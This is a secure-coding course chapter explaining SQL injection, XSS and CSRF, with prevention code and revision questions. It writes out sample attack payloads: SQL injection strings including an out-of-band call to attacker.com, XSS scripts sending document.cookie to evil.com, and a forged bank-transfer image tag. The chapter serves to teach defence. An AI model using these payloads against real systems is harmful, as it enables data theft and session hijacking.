# Chapter 2.2: Common Vulnerabilities (SQL Injection, XSS, CSRF)

## Overview

This chapter provides an in-depth look at the three most prevalent web application vulnerabilities: **SQL Injection**, **Cross-Site Scripting (XSS)**, and **Cross-Site Request Forgery (CSRF)**. Understanding how these attacks work is essential for writing secure code.

---

## SQL Injection (SQLi)

### How SQL Injection Works

```
NORMAL FLOW:
  User Input: "alice"
  
  Query: SELECT * FROM users WHERE username = 'alice'
  Result: Returns Alice's record ✓

ATTACK FLOW:
  User Input: ' OR '1'='1' --
  
  Query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
                                                ^^^^^^^^^^^^
                                                Always TRUE!
  Result: Returns ALL user records! ✗

ANATOMY OF THE ATTACK:
  +-----------------------------------------------------------+
  |  Input:    ' OR '1'='1' --                                 |
  |            |  |        |  |                                 |
  |            |  |        |  +-- Comment out rest of query     |
  |            |  |        +-- Always evaluates to TRUE         |
  |            |  +-- OR operator                                |
  |            +-- Close the original quote                      |
  +-----------------------------------------------------------+
```

### Types of SQL Injection

```
1. IN-BAND (Classic)
+----------------------------------------------------------+
| - Error-based: Extracts data from error messages          |
| - Union-based: Uses UNION SELECT to combine results       |
|                                                            |
| Example: ' UNION SELECT username, password FROM admins -- |
+----------------------------------------------------------+

2. BLIND
+----------------------------------------------------------+
| - Boolean-based: True/False responses                     |
|   Input: ' AND 1=1 --  (returns data = TRUE)             |
|   Input: ' AND 1=2 --  (no data = FALSE)                 |
|                                                            |
| - Time-based: Uses delays                                 |
|   Input: ' OR IF(1=1, SLEEP(5), 0) --                    |
|   (5-second delay = TRUE)                                 |
+----------------------------------------------------------+

3. OUT-OF-BAND
+----------------------------------------------------------+
| - Uses DNS or HTTP to exfiltrate data                     |
| - Less common, used when other methods fail               |
|   Input: '; EXEC xp_dirtree '\\attacker.com\share' --    |
+----------------------------------------------------------+
```

### Prevention: Parameterized Queries

```python
# ==========================================
# VULNERABLE CODE (String concatenation)
# ==========================================
def get_user(username):
    query = "SELECT * FROM users WHERE name = '" + username + "'"
    cursor.execute(query)  # DANGEROUS!

# ==========================================
# SECURE CODE (Parameterized query)
# ==========================================
def get_user(username):
    query = "SELECT * FROM users WHERE name = %s"
    cursor.execute(query, (username,))  # SAFE!

# ==========================================
# SECURE CODE (ORM - SQLAlchemy)
# ==========================================
def get_user(username):
    user = User.query.filter_by(name=username).first()  # SAFE!
```

```java
// Java - PreparedStatement (SAFE)
String query = "SELECT * FROM users WHERE name = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();

// Java - VULNERABLE
String query = "SELECT * FROM users WHERE name = '" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);  // DANGEROUS!
```

```javascript
// Node.js - VULNERABLE
const query = `SELECT * FROM users WHERE name = '${username}'`;
db.query(query);  // DANGEROUS!

// Node.js - SAFE (parameterized)
const query = 'SELECT * FROM users WHERE name = ?';
db.query(query, [username]);  // SAFE!
```

---

## Cross-Site Scripting (XSS)

### How XSS Works

```
ATTACK FLOW:

  1. Attacker injects malicious script
  2. Server stores or reflects it
  3. Victim's browser executes the script
  4. Script steals data or performs actions

  +----------+         +----------+         +----------+
  | Attacker |         |  Server  |         |  Victim  |
  +----+-----+         +----+-----+         +----+-----+
       |                    |                     |
       | Post comment:       |                     |
       | <script>            |                     |
       | fetch('evil.com/   |                     |
       | steal?c='+         |                     |
       | document.cookie)   |                     |
       | </script>          |                     |
       |------------------->|                     |
       |                    | Stores comment      |
       |                    |                     |
       |                    | Victim views page   |
       |                    |-------------------->|
       |                    |                     |
       |                    |  Browser executes   |
       |                    |  <script>           |
       |                    |                     |
       | Receives cookie    |                     |
       |<-----------------------------------------|
       |                    |                     |
       | Uses cookie to     |                     |
       | hijack session     |                     |
       |------------------->|                     |
```

### Types of XSS

```
1. STORED XSS (Persistent)
+----------------------------------------------------------+
|  Malicious script stored in database                      |
|  Affects ALL users who view the content                   |
|  Most dangerous type                                       |
|                                                            |
|  Example: Blog comment, forum post, profile field          |
|                                                            |
|  Attack: User posts comment containing:                    |
|  <script>document.location='https://evil.com/steal?       |
|  cookie='+document.cookie</script>                         |
+----------------------------------------------------------+

2. REFLECTED XSS (Non-Persistent)
+----------------------------------------------------------+
|  Malicious script in URL, reflected back by server         |
|  Requires victim to click a crafted link                   |
|                                                            |
|  Example: Search results, error messages                   |
|                                                            |
|  Attack URL:                                               |
|  https://example.com/search?q=<script>alert('XSS')        |
|  </script>                                                 |
|                                                            |
|  Server responds: "No results for <script>alert('XSS')    |
|  </script>"  --> Browser executes the script!              |
+----------------------------------------------------------+

3. DOM-BASED XSS
+----------------------------------------------------------+
|  Vulnerability in client-side JavaScript                   |
|  Server never sees the malicious payload                   |
|                                                            |
|  Example:                                                  |
|  // Vulnerable JavaScript                                  |
|  document.getElementById('output').innerHTML =              |
|    window.location.hash.substring(1);                      |
|                                                            |
|  Attack URL:                                               |
|  https://example.com/page#<img src=x onerror=alert('XSS')>|
+----------------------------------------------------------+
```

### XSS Prevention

```python
# ==========================================
# VULNERABLE (No output encoding)
# ==========================================
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Results for: {query}</h1>"  # DANGEROUS!

# ==========================================
# SECURE (Output encoding with template engine)
# ==========================================
@app.route('/search')
def search():
    query = request.args.get('q')
    return render_template('search.html', query=query)
    # Jinja2 auto-escapes: <script> becomes &lt;script&gt;
```

```html
<!-- Template with auto-escaping (Jinja2) -->
<h1>Results for: {{ query }}</h1>
<!-- Output: Results for: &lt;script&gt;alert('XSS')&lt;/script&gt; -->

<!-- Content Security Policy Header -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

**Prevention Checklist:**
```
+--------------------------------------------------------------+
| XSS PREVENTION                                               |
+--------------------------------------------------------------+
| [x] Output encoding (HTML entity encoding)                   |
| [x] Content Security Policy (CSP) headers                   |
| [x] Use auto-escaping template engines                       |
| [x] Input validation (whitelist approach)                    |
| [x] HTTPOnly cookie flag (prevents JS access)               |
| [x] Sanitize HTML if rich text is needed (DOMPurify)        |
| [x] Use textContent not innerHTML in JavaScript              |
+--------------------------------------------------------------+
```

---

## Cross-Site Request Forgery (CSRF)

### How CSRF Works

```
ATTACK FLOW:

  1. Victim is logged into bank.com (has session cookie)
  2. Victim visits attacker's page (evil.com)
  3. Evil page sends request to bank.com
  4. Browser attaches victim's cookies automatically
  5. Bank processes the fraudulent request

  +----------+        +----------+        +----------+
  |  Victim  |        | evil.com |        | bank.com |
  +----+-----+        +----+-----+        +----+-----+
       |                    |                    |
       | Visit evil.com     |                    |
       |------------------->|                    |
       |                    |                    |
       | Page loads with:   |                    |
       | <img src="https:// |                    |
       | bank.com/transfer? |                    |
       | to=attacker&       |                    |
       | amount=10000">     |                    |
       |                    |                    |
       | Browser auto-sends |                    |
       | request with       |                    |
       | bank.com cookies   |                    |
       |---------------------------------------->|
       |                    |                    |
       |                    |         Transfer   |
       |                    |         processed! |
       |                    |                    |
```

### CSRF Prevention

```python
# ==========================================
# Flask-WTF CSRF Protection
# ==========================================
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')
csrf = CSRFProtect(app)

# In template:
# <form method="POST">
#     {{ csrf_token() }}
#     <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
#     ...
# </form>

# ==========================================
# Django (CSRF built-in)
# ==========================================
# In template:
# <form method="POST">
#     {% csrf_token %}
#     ...
# </form>

# ==========================================
# Express.js with csurf
# ==========================================
# const csrf = require('csurf');
# const csrfProtection = csrf({ cookie: true });
# 
# app.get('/form', csrfProtection, (req, res) => {
#     res.render('form', { csrfToken: req.csrfToken() });
# });
```

### CSRF Prevention Methods

```
+================================================================+
|  METHOD 1: SYNCHRONIZER TOKEN PATTERN (Most Common)            |
+================================================================+
|                                                                  |
|  Server generates unique token per session/form                  |
|  Token embedded in form as hidden field                          |
|  Server validates token on form submission                       |
|                                                                  |
|  Form:                                                           |
|  <form method="POST" action="/transfer">                        |
|    <input type="hidden" name="_csrf"                            |
|           value="a1b2c3d4e5f6">                                 |
|    <input name="amount" value="100">                            |
|    <button>Transfer</button>                                    |
|  </form>                                                         |
|                                                                  |
|  Attacker CANNOT read this token from another domain!           |
+================================================================+

+================================================================+
|  METHOD 2: SAMESITE COOKIE ATTRIBUTE                            |
+================================================================+
|                                                                  |
|  Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly  |
|                                                                  |
|  SameSite=Strict: Cookie NOT sent on cross-site requests        |
|  SameSite=Lax: Cookie sent only on top-level GET navigations    |
|  SameSite=None: Cookie always sent (requires Secure flag)       |
|                                                                  |
+================================================================+

+================================================================+
|  METHOD 3: DOUBLE SUBMIT COOKIE                                 |
+================================================================+
|                                                                  |
|  1. Set a random value in a cookie AND form field               |
|  2. Server compares both on submission                          |
|  3. Attacker can send cookie but can't read/set form field      |
|                                                                  |
+================================================================+
```

---

## Comparison Table

```
+==================+==================+==================+
|   SQL Injection  |       XSS        |       CSRF       |
+==================+==================+==================+
| Targets: Server  | Targets: Client  | Targets: Server  |
| (Database)       | (Browser)        | (via Client)     |
+------------------+------------------+------------------+
| Attacker sends   | Attacker injects | Attacker tricks  |
| malicious SQL    | malicious script | user's browser   |
| to database      | into web page    | into sending     |
|                  |                  | legitimate req   |
+------------------+------------------+------------------+
| Input:           | Input:           | Input:           |
| ' OR 1=1 --     | <script>...</>   | Crafted link/    |
|                  |                  | hidden form      |
+------------------+------------------+------------------+
| Impact:          | Impact:          | Impact:          |
| Data theft,      | Session hijack,  | Unauthorized     |
| data deletion,   | defacement,      | actions on       |
| full DB access   | cookie theft     | behalf of user   |
+------------------+------------------+------------------+
| Prevention:      | Prevention:      | Prevention:      |
| Parameterized    | Output encoding, | CSRF tokens,     |
| queries, ORM     | CSP, sanitize    | SameSite cookie  |
+------------------+------------------+------------------+
```

---

## Real-World Attack Examples

### SQL Injection: Heartland Payment Systems (2008)

```
+------------------------------------------------------------+
| ATTACK: SQL injection into Heartland's web application     |
| IMPACT: 130 million credit card numbers stolen              |
| COST:   $140 million in fines and settlements               |
|                                                              |
| PREVENTION: Parameterized queries + WAF + regular pentests  |
+------------------------------------------------------------+
```

### XSS: British Airways (2018)

```
+------------------------------------------------------------+
| ATTACK: Magecart group injected XSS into payment page      |
| IMPACT: 380,000 payment card details stolen                 |
| COST:   £183 million GDPR fine                              |
|                                                              |
| PREVENTION: CSP headers + Subresource Integrity + monitoring|
+------------------------------------------------------------+
```

---

## Troubleshooting Tips

| Problem | Cause | Solution |
|---------|-------|----------|
| SQLi found in legacy code | Old code uses string concatenation | Migrate to ORM or parameterized queries incrementally |
| XSS in rich text editor | Need to allow some HTML | Use DOMPurify or bleach to sanitize, whitelist allowed tags |
| CSRF token validation failing | Token mismatch after form timeout | Implement token refresh or longer expiry |
| WAF blocking legitimate requests | Overly strict rules | Tune WAF rules, whitelist known patterns |
| False positives in SAST for SQLi | Tool doesn't recognize ORM | Configure tool to recognize your ORM as safe sink |

---

## Summary Table

| Vulnerability | CWE | Attack Vector | Prevention |
|--------------|-----|---------------|------------|
| **SQL Injection** | CWE-89 | Malicious SQL in user input | Parameterized queries, ORM, input validation |
| **Stored XSS** | CWE-79 | Script stored in database | Output encoding, CSP, auto-escaping templates |
| **Reflected XSS** | CWE-79 | Script in URL reflected by server | Output encoding, CSP, input validation |
| **DOM XSS** | CWE-79 | Client-side JS vulnerability | Use textContent, sanitize, CSP |
| **CSRF** | CWE-352 | Forged request from another site | CSRF tokens, SameSite cookies |

---

## Quick Revision Questions

1. **What is the fundamental difference between SQL Injection and XSS?**
   > SQL Injection targets the server-side database by injecting malicious SQL queries. XSS targets the client-side browser by injecting malicious JavaScript that executes in another user's browser.

2. **Explain the three types of XSS and which is most dangerous.**
   > Stored XSS (persistent, stored in DB — most dangerous as it affects all viewers), Reflected XSS (in URL, requires victim to click link), DOM-based XSS (client-side JS vulnerability, server never sees payload).

3. **Why does CSRF work even though the attacker can't see the victim's cookies?**
   > The attacker doesn't need to see the cookies. The browser automatically attaches cookies for a domain with every request to that domain, including forged cross-origin requests. The attacker just needs the victim to trigger the request.

4. **What is a parameterized query and why does it prevent SQL injection?**
   > A parameterized query separates SQL logic from data by using placeholders (?). The database engine treats the parameter as a literal value, not as executable SQL code, so injected SQL syntax is harmless.

5. **How does Content Security Policy (CSP) help prevent XSS?**
   > CSP restricts which sources can execute scripts on a page (e.g., only `'self'`). Even if an attacker injects a `<script>` tag, the browser won't execute it if the source isn't whitelisted in the CSP header.

6. **What is the SameSite cookie attribute and how does it prevent CSRF?**
   > SameSite=Strict prevents the browser from sending the cookie with any cross-site request. SameSite=Lax sends it only with top-level GET navigations. This prevents forged POST requests from other sites from including authentication cookies.

---

[← Previous: 2.1 OWASP Top 10](01-owasp-top-10.md) | [Next: 2.3 Secure Coding Guidelines →](03-secure-coding-guidelines.md)

[Back to Table of Contents](../README.md)
